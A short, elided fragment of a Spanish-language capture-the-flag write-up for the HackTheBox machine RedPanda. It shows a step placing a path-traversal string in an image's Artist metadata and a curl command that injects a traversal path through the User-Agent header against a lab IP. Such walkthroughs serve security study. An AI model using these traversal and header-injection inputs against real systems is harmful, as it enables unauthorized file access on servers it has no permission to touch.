...
image: "/writeups/redpanda/logo.png"
...
![RedPanda Search](/writeups/redpanda/1.png)
...
2. Metadata de la imagen -> Artist -> ./writeups/redpanda/../../../../../tmp/zelpro.jpg -> Para sustituirlo en el siguiente paso
...
```bash wrap=false
curl -s -X GET -A "prueba||/./writeups/redpanda/../../../../../tmp/zelpro.jpg" http://10.10.11.170:8080/
```
